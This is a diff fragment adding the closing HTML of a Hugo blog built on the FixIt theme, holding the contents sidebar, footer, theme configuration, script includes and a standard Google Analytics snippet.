+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
